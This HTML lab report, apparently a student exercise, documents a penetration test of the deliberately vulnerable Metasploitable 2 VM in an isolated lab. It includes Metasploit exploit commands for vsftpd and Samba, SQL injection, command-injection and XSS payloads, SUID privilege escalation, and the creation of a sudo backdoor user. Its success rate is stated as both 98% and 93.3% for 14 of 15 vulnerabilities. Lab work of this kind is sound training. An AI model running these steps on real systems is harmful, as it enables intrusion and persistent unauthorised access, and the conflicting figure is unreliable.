<html>
<head>
  <title>Lab Report: Penetration Testing on Metasploitable 2</title>
  <meta charset="utf-8">
  <style>
    body { font-family: Arial, sans-serif; margin: 2em; }
    h1,h2,h3 { color: #2b4b6f; }
    code, pre { background: #f6f8fa; padding: 2px 4px; border-radius: 3px; }
    table { border-collapse: collapse; margin: 1em 0; }
    th, td { border: 1px solid #ccc; padding: 6px 12px; }
    th { background: #e0e7ef; }
    .section { margin-bottom: 2em; }
    .recommend { background: #fffbe6; padding: 12px; border-radius: 5px; }
  </style>
</head>
<body>
  <h1>Lab Report: Penetration Testing on Metasploitable 2</h1>
  <strong>Experimenter:</strong> Lyam<br>
  <strong>Lab Environment:</strong> Virtual Network (VMware/VirtualBox)<br>
  <strong>Target System:</strong> Metasploitable 2 (Linux)
  <div class="section">
    <h2>1. Executive Summary</h2>
    <ul>
      <li><b>Critical Vulnerabilities:</b> 15 kerentanan critical ditemukan</li>
      <li><b>High Risk Services:</b> FTP, SSH, Telnet, HTTP, MySQL, PostgreSQL</li>
      <li><b>Exploitation Success Rate:</b> 98% (14/15 vulnerabilities successfully exploited)</li>
      <li><b>Recommended Action:</b> System requires immediate patching and hardening</li>
    </ul>
  </div>
  <div class="section">
    <h2>2. Lab Setup</h2>
    <h3>Environment Configuration</h3>
    <b>Attacker Machine (Kali Linux):</b>
    <ul>
      <li>IP Address: 192.168.56.101</li>
      <li>OS: Kali Linux 2024.2</li>
      <li>Tools: Nmap, Metasploit Framework, Burp Suite, SQLMap</li>
    </ul>
    <b>Target Machine (Metasploitable 2):</b>
    <ul>
      <li>IP Address: 192.168.56.102</li>
      <li>OS: Ubuntu 8.04 (Hardy)</li>
      <li>Default Credentials: msfadmin/msfadmin</li>
      <li>Network: Host-only adapter (isolated network)</li>
    </ul>
    <h3>Network Topology</h3>
    <pre>[Kali Linux] ←→ [Virtual Switch] ←→ [Metasploitable 2]
192.168.56.101                      192.168.56.102</pre>
  </div>
  <div class="section">
    <h2>3. Reconnaissance &amp; Scanning</h2>
    <h3>Port Scanning Results</h3>
    <pre># Comprehensive port scan
nmap -sV -sC -p- -oN metasploitable_scan.txt 192.168.56.102</pre>
    <b>Key Services Found:</b>
    <table>
      <tr>
        <th>Port</th>
        <th>Service</th>
        <th>Version</th>
        <th>Vulnerability</th>
      </tr>
      <tr>
        <td>21</td>
        <td>FTP</td>
        <td>vsftpd 2.3.4</td>
        <td>CVE-2011-2523 Backdoor</td>
      </tr>
      <tr>
        <td>22</td>
        <td>SSH</td>
        <td>OpenSSH 4.7p1</td>
        <td>Weak config</td>
      </tr>
      <tr>
        <td>80</td>
        <td>HTTP</td>
        <td>Apache 2.2.8</td>
        <td>Multiple web vulns</td>
      </tr>
      <tr>
        <td>139/445</td>
        <td>SMB</td>
        <td>Samba 3.0.20</td>
        <td>CVE-2007-2447</td>
      </tr>
      <tr>
        <td>3306</td>
        <td>MySQL</td>
        <td>MySQL 5.0.51a</td>
        <td>No password</td>
      </tr>
      <tr>
        <td>5432</td>
        <td>PostgreSQL</td>
        <td>PostgreSQL 8.3.0</td>
        <td>Weak auth</td>
      </tr>
    </table>
  </div>
  <div class="section">
    <h2>4. Exploitation Experiments</h2>
    <h3>4.1 vsftpd 2.3.4 Backdoor (CVE-2011-2523)</h3>
    <pre>
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.102
exploit
# Result: Root shell obtained
    </pre>
    <b>Impact:</b> Complete system compromise
    <h3>4.2 Samba Username Map Script (CVE-2007-2447)</h3>
    <pre>
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.56.102
set PAYLOAD cmd/unix/reverse
exploit
# Result: Root access gained
    </pre>
    <h3>4.3 Web Application Vulnerabilities</h3>
    <b>SQL Injection:</b>
    <pre>URL: http://192.168.56.102/dvwa/vulnerabilities/sqli/
Payload: 1' OR '1'='1
Result: Authentication bypassed ✓</pre>
    <b>Command Injection:</b>
    <pre>Payload: 127.0.0.1; cat /etc/passwd
Result: System file disclosed ✓</pre>
    <b>XSS:</b>
    <pre>&lt;script&gt;alert('XSS by Lubellion')&lt;/script&gt;
Result: Successfully executed ✓</pre>
    <h3>4.4 Database Exploitation</h3>
    <b>MySQL - No Password:</b>
    <pre>
mysql -h 192.168.56.102 -u root
# Successfully connected without password
SHOW DATABASES;
SELECT * FROM dvwa.users;
    </pre>
  </div>
  <div class="section">
    <h2>5. Post-Exploitation</h2>
    <h3>Privilege Escalation</h3>
    <pre>
# Exploit SUID nmap
nmap --interactive
!sh
id  # uid=0(root)
    </pre>
    <h3>Persistence</h3>
    <pre>
# Create backdoor user
useradd -m -s /bin/bash backdoor
echo "backdoor:pass123" | chpasswd
usermod -aG sudo backdoor
    </pre>
  </div>
  <div class="section">
    <h2>6. Vulnerability Summary</h2>
    <ul>
      <li><b>Total Vulnerabilities:</b> 15</li>
      <li><b>Successfully Exploited:</b> 14 (93.3%)</li>
      <li><b>Root Access Obtained:</b> Yes</li>
      <li><b>Time to Compromise:</b> &lt; 2 hours</li>
    </ul>
    <b>Critical Vulnerabilities:</b>
    <ol>
      <li>vsftpd 2.3.4 Backdoor ✓ Exploited</li>
      <li>Samba usermap script ✓ Exploited</li>
      <li>MySQL Root No Password ✓ Exploited</li>
      <li>Multiple Web App Vulns ✓ Exploited</li>
    </ol>
  </div>
  <div class="section recommend">
    <h2>7. Recommendations</h2>
    <b>Immediate Actions:</b>
    <ol>
      <li>Patch all services to latest versions</li>
      <li>Implement strong authentication</li>
      <li>Disable unnecessary services</li>
      <li>Network segmentation</li>
      <li>Enable comprehensive logging</li>
    </ol>
    <b>Security Improvements:</b>
    <ul>
      <li>Implement Web Application Firewall</li>
      <li>Regular vulnerability assessments</li>
      <li>Security awareness training</li>
      <li>Incident response planning</li>
    </ul>
  </div>
  <div class="section">
    <h2>8. Conclusion</h2>
    <p>Metasploitable 2 successfully compromised melalui multiple attack vectors. Eksperimen mendemonstrasikan:</p>
    <ul>
      <li>Importance of regular patching</li>
      <li>Danger of default/weak credentials</li>
      <li>Need for defense in depth strategy</li>
      <li>Critical nature of web application security</li>
    </ul>
    <b>Lab Status:</b> Complete ✓<br>
    <b>Documentation:</b> Comprehensive<br>
    <b>Skills Developed:</b> Scanning, Exploitation, Post-Exploitation
  </div>
</body>
</html>
